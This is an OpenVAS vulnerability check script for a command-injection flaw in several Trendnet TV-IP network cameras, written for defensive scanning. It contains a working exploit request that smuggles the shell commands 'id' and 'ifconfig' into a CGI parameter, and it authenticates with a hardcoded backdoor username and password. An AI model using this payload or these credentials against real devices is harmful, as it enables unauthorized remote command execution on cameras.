###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trendnet_tv_ip_rce_11_14.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Multiple Trendnet TV-IP Cams Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105108");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13659 $");

  script_name("Multiple Trendnet TV-IP Cams Command Injection Vulnerability");

  script_xref(name:"URL", value:"https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to execute arbitrary
commands in the context of the affected device.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response.");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Multiple Trendnet TV-IP Cams are prone to a command-injection
vulnerability.");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-11-05 12:38:34 +0100 (Wed, 05 Nov 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("netcam/banner");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

banner = get_http_banner( port:port );
if( ! banner || 'Basic realm="netcam"' >!< banner ) exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

req = 'GET /cgi/maker/ptcmd.cgi?cmd=;id;ifconfig; HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Accept-Language: de,en-US;q=0.7,en;q=0.3\r\n' +
      'Accept-Encoding: identity\r\n' +
      'Authorization: Basic cHJvZHVjdG1ha2VyOmZ0dnNiYW5uZWRjb2Rl\r\n' + # productmaker:ftvsbannedcode
      'Connection: close\r\n' +
      'Pragma: no-cache\r\n' +
      'Cache-Control: no-cache\r\n' +
      '\r\n';
result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( result =~ 'uid=[0-9]+.*gid=[0-9]+' || ( "Link encap:Ethernet" >< result || "inet addr:" >< result ) )
{
  security_message( port:port );
  exit( 0 );
}

exit( 0 );
